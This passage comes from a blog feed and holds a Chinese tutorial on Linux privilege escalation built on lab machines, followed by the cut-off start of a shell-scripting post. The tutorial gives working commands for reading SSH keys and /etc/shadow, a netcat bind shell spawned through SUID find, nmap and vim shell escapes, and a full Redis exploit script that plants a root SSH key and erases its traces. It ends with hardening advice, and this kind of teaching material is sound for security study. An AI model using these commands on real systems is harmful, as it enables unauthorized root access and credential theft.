            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权总结</title>
      <link href="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要提权"><a href="#为什么要提权" class="headerlink" title="为什么要提权?"></a>为什么要提权?</h1><p>当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行root 权限下的一下命令或者读取/root  下的重要文件。这个时候就需要提权，在root  权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。</p><h1 id="什么是权限"><a href="#什么是权限" class="headerlink" title="什么是权限"></a>什么是权限</h1><p>在Linux 系统中，<code>ls -al</code> 即可查看列出文件所属的权限。</p><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311164240865.png" alt="image-20220311164240865"></p><p>分析:</p><pre><code class="php">-rw-r--r--.  1 root root   176 5月  18 2020 .bash_profile</code></pre><p><strong>第一组数据</strong></p><pre><code class="php">-rw-r--r--</code></pre><p>第一位：</p><p><code>-</code> : 代表普通文件</p><p><code>d</code>：代表目录</p><p><code>l</code>：代表软链接</p><p><code>b</code>：代表块文件</p><p><code>c</code>：代表字符设备</p><p>第二及后面几位,分别三个为一组：</p><pre><code class="php">rw-r--r--  代表文件所属的权限</code></pre><p>r : 文件可读。w : 文件可修改。- : 表示暂时没有其他权限。x : 表示可执行</p><p>第一个<code>rw-</code> 表示文件所拥有者的权限。</p><p>第二个<code>r--</code> 表示文件所在组的用户的权限。</p><p>第三个<code>r--</code>  表示其他组的用户的权限。</p><p><strong>第二组数据</strong></p><pre><code>1</code></pre><ul><li>如果文件类型为目录，表示目录下的字目录个数</li><li>如果文件类型是普通文件，这个数据就表示这个文件的硬链接个数</li></ul><p><strong>第三组数据</strong></p><pre><code>root</code></pre><p>表示该文件所有者为root 用户</p><p><strong>第四组数据</strong></p><pre><code>root</code></pre><p>表示该文件所在组为root 组</p><p><strong>第五组数据</strong></p><pre><code>176</code></pre><p>表示文件的大小为多少字节。如果为一个目录，则为4096。</p><p><strong>第六组数据</strong></p><pre><code>5月  18 2020</code></pre><p>表示最后一次修改时间</p><p><strong>第七组数据</strong></p><pre><code>.bash_profile</code></pre><p>表示文件名称</p><p>如果为目录，r 表示可以进入该目录进行查看,w 表示文件可以进行增加,x 表示可以进入这个目录.</p><p>同样的，可以用数字代替，r=4,w=2,x=1。</p><h1 id="怎么样提权"><a href="#怎么样提权" class="headerlink" title="怎么样提权"></a>怎么样提权</h1><p>提权的本质是信息搜集。</p><h2 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><h3 id="自动化信息搜集工具"><a href="#自动化信息搜集工具" class="headerlink" title="自动化信息搜集工具"></a>自动化信息搜集工具</h3><p>LinEnum:<a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>linuxprivchecker:<a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a> </p><h3 id="自动化漏洞探测工具"><a href="#自动化漏洞探测工具" class="headerlink" title="自动化漏洞探测工具"></a>自动化漏洞探测工具</h3><p>linux-exploit-suggester:<a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>linux-exploit-suggester2:<a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a> </p><h3 id="内核，操作系统，设备信息"><a href="#内核，操作系统，设备信息" class="headerlink" title="内核，操作系统，设备信息"></a>内核，操作系统，设备信息</h3><pre><code>uname -a    打印所有可用的系统信息uname -r    内核版本uname -n    系统主机名。uname -m    查看系统内核架构（64位/32位）hostname    系统主机名cat /proc/version    内核信息cat /etc/*-release   分发信息cat /etc/issue       分发信息cat /proc/cpuinfo    CPU信息cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhatls /boot | grep vmlinuz-</code></pre><h3 id="用户和群组"><a href="#用户和群组" class="headerlink" title="用户和群组"></a>用户和群组</h3><pre><code>cat /etc/passwd     列出系统上的所有用户cat /var/mail/rootcat /var/spool/mail/rootcat /etc/group      列出系统上的所有组grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 &#123; print $1&#125;&#39;      列出所有的超级用户账户whoami              查看当前用户w                   谁目前已登录，他们正在做什么last                最后登录用户的列表lastlog             所有用户上次登录的信息lastlog –u %username%  有关指定用户上次登录的信息lastlog |grep -v &quot;Never&quot;  以前登录用户的完</code></pre><h3 id="用户权限信息"><a href="#用户权限信息" class="headerlink" title="用户权限信息"></a>用户权限信息</h3><pre><code>whoami        当前用户名id            当前用户信息cat /etc/sudoers  谁被允许以root身份执行sudo -l       当前用户可以以root身份执行操作</code></pre><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><pre><code>env        显示环境变量set        现实环境变量echo %PATH 路径信息history    显示当前用户的历史命令记录pwd        输出工作目录cat /etc/profile   显示默认系统变量cat /etc/shells    显示可用的shellrccat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logout</code></pre><h3 id="进程和服务"><a href="#进程和服务" class="headerlink" title="进程和服务"></a>进程和服务</h3><pre><code>ps auxps -eftopcat /etc/services</code></pre><p>查看以root 运行的进程</p><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h3 id="查看安装的软件"><a href="#查看安装的软件" class="headerlink" title="查看安装的软件"></a>查看安装的软件</h3><pre><code>ls -alh /usr/bin/ls -alh /sbin/ls -alh /var/cache/yum/dpkg -l</code></pre><h3 id="服务-插件"><a href="#服务-插件" class="headerlink" title="服务/插件"></a>服务/插件</h3><p>检查有没有不安全的服务配置，和一些有漏洞的插件。</p><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</code></pre><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h3 id="有无明文存放用户密码"><a href="#有无明文存放用户密码" class="headerlink" title="有无明文存放用户密码"></a>有无明文存放用户密码</h3><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</code></pre><p>Vulnhub 上的靶机就体现在，通过邮件明文传输密码了，然后就可以通过ssh登陆了。进行新的信息搜集。</p><h3 id="有无ssh-私钥"><a href="#有无ssh-私钥" class="headerlink" title="有无ssh 私钥"></a>有无ssh 私钥</h3><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h3 id="查看与当前机器通信的其他用户或者主机"><a href="#查看与当前机器通信的其他用户或者主机" class="headerlink" title="查看与当前机器通信的其他用户或者主机"></a>查看与当前机器通信的其他用户或者主机</h3><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h3 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h3><pre><code>cat /var/log/boot.logcat /var/log/croncat /var/log/syslogcat /var/log/wtmpcat /var/run/utmpcat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</code></pre><h3 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;echo os.system(&#39;/bin/bash&#39;)/bin/sh -i</code></pre><h3 id="可提权SUID-amp-amp-GUID"><a href="#可提权SUID-amp-amp-GUID" class="headerlink" title="可提权SUID &amp;&amp; GUID"></a>可提权SUID &amp;&amp; GUID</h3><blockquote><p>参考资料<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p></blockquote><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</code></pre><h3 id="查看可写-执行目录"><a href="#查看可写-执行目录" class="headerlink" title="查看可写/执行目录"></a>查看可写/执行目录</h3><pre><code>find / -writable -type d 2&gt;/dev/null      # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o w -type d 2&gt;/dev/null     # world-writeable foldersfind / -perm -o x -type d 2&gt;/dev/null     # world-executable foldersfind / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</code></pre><h3 id="查看安装过的工具"><a href="#查看安装过的工具" class="headerlink" title="查看安装过的工具"></a>查看安装过的工具</h3><pre><code>find / -name perl*find / -name python*find / -name gcc*...</code></pre><h1 id="提权操作"><a href="#提权操作" class="headerlink" title="提权操作"></a>提权操作</h1><h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><blockquote><p>什么是suid？suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。通俗的理解为其他用户执行这个程序的时候可以用该程序所有者/组的权限。需要注意的是，只有程序的所有者是0号或其他super user，同时拥有suid权限，才可以提权。</p></blockquote><p>这里推荐 P师傅的 <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p>常见的可用来提权的Linux 可执行文件有：</p><p>Nmap, Vim, find, bash, more, less, nano, cp</p><p>查看可以suid 提权的可执行文件</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220311170215513.png" alt="image-20220311170215513"></p><ul><li>find</li></ul><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-793add5c-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-793add5c-ba7a-1.png" alt="img"></a></p><pre><code>ls -al /usr/bin/find-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find</code></pre><blockquote><p>实用程序find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p></blockquote><p>比如：DC -1 靶机就是利用find 命令进行root 用户来执行命令</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-796d1704-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-796d1704-ba7a-1.png" alt="img"></a></p><p>大部分Linux 系统都安装了nc。使用<code>find aaa - exec netcat -lvp 5555 -e /bin/sh \;</code>  即可成功反弹root shell</p><ul><li>nmap</li></ul><p>早期nmap 具有交互模式，version 2.02～5.21（5.2.0）。这里我用metasploitable2 来演示</p><p><code>namp -V</code> 查看nmap 版本信息</p><pre><code>nmap --interactive</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164705-9e3b1b62-b2d2-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164705-9e3b1b62-b2d2-1.png" alt="img"></a></p><p>我最喜欢的<code>Metasploit</code> 中就有利用 SUID nmap 提权的exp</p><p><code>search nmap</code> 然后利用 <code>exploit/unix/local/setuid_nmap</code> 漏洞利用模块即可</p><p>5.2.0 之后，nmap 还可以通过执行脚本来提权。</p><pre><code># nse 脚本，shell.nseos.execute(&#39;/bin/sh&#39;)# nmap 提权nmap --script=shell.nse # 在某些发行版的Linux 可能会提权失败。具体原理移步p 师傅文章</code></pre><p>或者</p><pre><code>echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; getshellsudo nmap --script=getshell</code></pre><p>参考DC 6 靶机：<a href="https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83">https://hack-for.fun/posts/8886.html#%E6%8F%90%E6%9D%83</a></p><ul><li>vim</li></ul><p>如果vim 是通过SUID运行，就会继承root用户的权限。可读取只有root能读取的文件。</p><pre><code>vim /etc/shadow</code></pre><p>vim 运行shell</p><pre><code>vim:set shell=/bin/sh:shell</code></pre><p>同理，满足条件的 less 和 more 都可。</p><h3 id="利用内核漏洞"><a href="#利用内核漏洞" class="headerlink" title="利用内核漏洞"></a>利用内核漏洞</h3><p>比如DC 3 靶机，就是利用系统内核漏洞来进行提权。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103617-79a162ac-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103617-79a162ac-ba7a-1.png" alt="img"></a></p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>将exp 下载下来，解压，编译，运行，即可get root 权限。</p><pre><code>tar xvf exploit.tar</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-79fd0a12-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-79fd0a12-ba7a-1.png" alt="img"></a></p><p><a href="https://www.exploit-db.com/exploits/39772">https://www.exploit-db.com/exploits/39772</a></p><p>还有大名鼎鼎的CVE-2016-5195，脏牛漏洞。（Linux kernel &gt;=2.6.22 并且Android也受影响</p><ul><li><a href="https://github.com/timwr/CVE-2016-5195">https://github.com/timwr/CVE-2016-5195</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></li><li>复现参考：<a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></li></ul><p>其他内核漏洞：</p><p>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) – ‘overlayfs’ Local Root Shell</p><p><a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p><p>Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) – ‘overlayfs’ Local Root Exploit</p><p><a href="https://www.exploit-db.com/exploits/39166/">https://www.exploit-db.com/exploits/39166/</a></p><p>Linux Kernel 4.3.3 – ‘overlayfs’ Local Privilege Escalation</p><p><a href="https://www.exploit-db.com/exploits/39230/">https://www.exploit-db.com/exploits/39230/</a></p><blockquote><p>提示：内核exploit提权有风险，有可能会崩溃系统。</p></blockquote><h3 id="利用root无密码执行"><a href="#利用root无密码执行" class="headerlink" title="利用root无密码执行"></a>利用root无密码执行</h3><p>简单来说，就是一个脚本，比如py,sh等或者是一个命令。这个文件可以以root身份运行，若在无密码的情况下执行的话，我们可以通过修改脚本内容/或者直接执行这个命令，利用命令来进行一些操作，来进行提权。</p><p>比如常见的：</p><ul><li>写入一个root身份权限的用户进入/etc/passwd 文件中</li></ul><p>这里以DC 4 为例子：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a2357bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a2357bc-ba7a-1.png" alt="img"></a></p><p><code>teehee -a</code> 将输入的内容追加到另一个文件中</p><p>简单说下<code>/etc/passwd</code> 各个字段的含义：</p><pre><code>username:password:User ID:Group ID:comment:home directory:shell</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103618-7a3b91c4-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103618-7a3b91c4-ba7a-1.png" alt="img"></a></p><p>成功获取到root 权限。类似的操作还有很多，核心思想不变。</p><h3 id="利用环境变量提权"><a href="#利用环境变量提权" class="headerlink" title="利用环境变量提权"></a>利用环境变量提权</h3><p><code>PATH</code> 是Linux 和 Unix  操作系统中的环境变量，它指定存储可执行程序的所有bin和sbin目录。当用户在终端上执行任何命令时，它会通过PATH变量来响应用户执行的命令，并向shell发送请求以搜索可执行文件。超级用户通常还具有/sbin和/usr/sbin条目，以便于系统管理命令的执行。</p><p>使用echo命令显示当前PATH环境变量：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164053-c0c00b12-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164053-c0c00b12-b2d1-1.png" alt="img"></a></p><p>如果你在PATH变量中看到<code>.</code>，则意味着登录用户可以从当前目录执行二进制文件/脚本</p><p>我们先编译一个可执行文件shell。</p><pre><code>#include&lt;unistd.h&gt;void main()&#123;  setuid(0);  setgid(0);  system(&quot;cat /etc/passwd&quot;);&#125;// aaa.c</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164152-e392c15c-b2d1-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200620164152-e392c15c-b2d1-1.png" alt="img"></a></p><p>在给该文件赋予权限。</p><p>然后查看它的权限可以发现是有<code>s</code> 位，即suid。</p><p>现在我们在目标机器上用<code>find / -perm -u=s -type f 2&gt;/dev/null</code> 来查看可以suid提权的文件，发现之前编译的shell可执行文件在里面。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200620164258-0afb894a-b2d2-1.png" alt="img"></a></p><p>更多的操作可以参考：<a href="https://xz.aliyun.com/t/2767">https://xz.aliyun.com/t/2767</a></p><h3 id="利用存在漏洞的命令"><a href="#利用存在漏洞的命令" class="headerlink" title="利用存在漏洞的命令"></a>利用存在漏洞的命令</h3><p>不可否认的是命令很多，我们不可能熟悉每一种命令的漏洞。不过我们每次遇到了都可以用<code>searchsploit</code> 来寻找可利用的exp。</p><p>这里以DC 5 靶机为例：</p><p><code>ls -al</code> ：</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7a819cc8-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7a819cc8-ba7a-1.png" alt="img"></a></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103619-7acd7cec-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103619-7acd7cec-ba7a-1.png" alt="img"></a></p><p>可以通过cat 读取一下这个文件怎么用。</p><p>攻击机器开启一个http 服务：</p><pre><code>python -m SimpleHTTPServer</code></pre><p>将exploit 用 wget 下载到可执行的<code>/tmp/</code>目录下。然后执行<code>sh</code> 文件。最后在<code>/etc/</code>目录下执行<code>./rootshell</code> 即可get root shell。</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7afc19bc-ba7a-1.png"><img src="/2022/03/11/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/20200630103620-7afc19bc-ba7a-1.png" alt="img"></a></p><hr><p>还有之前爆的sudo 提权，CVE-2019-14187。只不过比较鸡肋。</p><blockquote><p><strong>Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。</strong></p></blockquote><p><strong>利用前提</strong></p><ol><li>sudo -v &lt; 1.8.28</li><li>知道当前用户的密码</li><li>当前用户存在于sudo权限列表</li></ol><p>复现参考：<a href="https://www.cnblogs.com/ethtool/p/12176730.html">https://www.cnblogs.com/ethtool/p/12176730.html</a></p><h3 id="利用第三方服务提权"><a href="#利用第三方服务提权" class="headerlink" title="利用第三方服务提权"></a>利用第三方服务提权</h3><h4 id="Docker-组提权"><a href="#Docker-组提权" class="headerlink" title="Docker 组提权"></a>Docker 组提权</h4><p>参考文章：<a href="https://blog.csdn.net/qq_41918771/article/details/103666135">https://blog.csdn.net/qq_41918771/article/details/103666135</a></p><blockquote><p>docker 组内用户执行命令的时候会自动在所有命令前添加 sudo。因为设计或者其他的原因，Docker  给予所有 docker 组的用户相当大的权力（虽然权力只体现在能访问 /var/run/docker.sock 上面）。默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker<br> 组用户访问 Docker。给用户提供 Docker 权限和给用户无需认证便可以随便获取的 root 权限差别不大。</p></blockquote><p>普通用户执行：即可获得root权限。</p><pre><code>docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</code></pre><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200630103620-7b334f7c-ba7a-1.png" alt="img"></a></p><h4 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL UDF 提权"></a>MySQL UDF 提权</h4><p>之前在做JarivsOJ CTF 里有一个题，里面就用了UDF，那是我第一次遇到这个东西。</p><pre><code>show variables like &#39;%compile%&#39;;show variables like &#39;plugin%&#39;;</code></pre><p>不过这里有一个限制，<code>show global variables like &#39;secure%&#39;</code> secure_file_priv 没有具体的值（即能够导出/写入文件</p><blockquote><p>当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权<br> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权<br> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权</p></blockquote><p>MSF 中的 <code>exploit/multi/mysql/mysql_udf_payload</code> 漏洞利用模块可以进行UDF提权</p><p>使用 <code>select sys_exec(&#39;whoami&#39;);</code> 或 <code>select sys_eval(&#39;whoami&#39;);</code> 来执行系统命令</p><h4 id="Redis-批量getshell"><a href="#Redis-批量getshell" class="headerlink" title="Redis 批量getshell"></a>Redis 批量getshell</h4><blockquote><p>如果Redis以root身份运行，黑客可以利用Redis写入SSH公钥文件，直接通过SSH免密码登录受害服务器。Redis 默认绑定在6379端口，并且没有开启认证，在没有任何访问策略的情况下，任何人可以直接在非授权情况下直接访问Redis服务并进行相关操作。</p></blockquote><p>相关利用exp：<a href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py</a></p><pre><code>#!/usr/bin/env python# -*- coding: utf-8 -*-# project = https://github.com/Xyntax/POC-T# author = i@cdxy.me&quot;&quot;&quot;redis getshell expliot (ssh authorized_keys)&quot;&quot;&quot;import redisimport paramikofrom plugin.util import host2IPfrom plugin.util import randomStringfrom plugin.util import checkPortTcpfrom paramiko.ssh_exception import SSHExceptionpublic_key = &#39;ssh-rsa =====&#39;private_key = &quot;&quot;&quot;-----BEGIN RSA PRIVATE KEY-----=====-----END RSA PRIVATE KEY-----&quot;&quot;&quot;import timedef poc(url):    url = host2IP(url)    ip = url.split(&#39;:&#39;)[0]    port = int(url.split(&#39;:&#39;)[-1]) if &#39;:&#39; in url else 6379    try:        if not checkPortTcp(ip, 22):            return False        r = redis.Redis(host=ip, port=port, db=0)        if &#39;redis_version&#39; in r.info():            key = randomString(10)            r.set(key, &#39;\n\n&#39; + public_key + &#39;\n\n&#39;)            r.config_set(&#39;dir&#39;, &#39;/root/.ssh&#39;)            r.config_set(&#39;dbfilename&#39;, &#39;authorized_keys&#39;)            r.save()            r.delete(key)  # 清除痕迹            r.config_set(&#39;dir&#39;, &#39;/tmp&#39;)            time.sleep(5)            if testConnect(ip, 22):                return True    except Exception:        return False    return Falsedef testConnect(ip, port=22):    try:        s = paramiko.SSHClient()        s.load_system_host_keys()        s.connect(ip, port, username=&#39;root&#39;, pkey=private_key, timeout=10)        s.close()        return True    except Exception, e:        if type(e) == SSHException:            return True        return False</code></pre><p>其他……</p><blockquote><p>一般情况情况下，内核漏洞或者第三方服务来提权的情况更多。</p></blockquote><h1 id="如何防止被提权"><a href="#如何防止被提权" class="headerlink" title="如何防止被提权"></a>如何防止被提权</h1><ul><li>系统管理员要安全，准确的配置SUID执行文件。</li><li>一些没必要以高权限用户执行的文件，应该取消权限。</li><li>规避使用无密码root 执行命令，脚本等。</li><li>修复/升级存在已知漏洞的组件，升级操作系统版本最新版。</li><li>Linux 2.2 之后可以为命令增加 capabilities, 以p 师傅博客里的给nmap增加该属性为例。</li><li>升级第三方服务，修复已知漏洞</li></ul><pre><code>sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmapnmap --privileged -sS 192.168.1.1</code></pre><p><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次学习，脑海里有了一个大概的思路，以后遇到了也不会迷惘。但是我旁边师傅给我说，靶机的提权有些在实际中根本用不到。所以，还是要灵活处理，核心思路应该是不变的吧！</p><p>注:本篇文章转自先知社区 ： <a href="https://xz.aliyun.com/t/7924#toc-0">https://xz.aliyun.com/t/7924#toc-0</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Linux提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux shell 脚本编程</title>
      <link href="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="文本三剑客之GREP与正则表达式入门"><a href="#文本三剑客之GREP与正则表达式入门" class="headerlink" title="文本三剑客之GREP与正则表达式入门"></a>文本三剑客之GREP与正则表达式入门</h1><h2 id="grep命令详解"><a href="#grep命令详解" class="headerlink" title="grep命令详解"></a>grep命令详解</h2><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309163744532.png" alt="image-20220309163744532"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164006965.png" alt="image-20220309164006965"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164124381.png" alt="image-20220309164124381"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164153116.png" alt="image-20220309164153116"></p><p><img src="/2022/03/09/Linux-shell-%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20220309164202884.png" 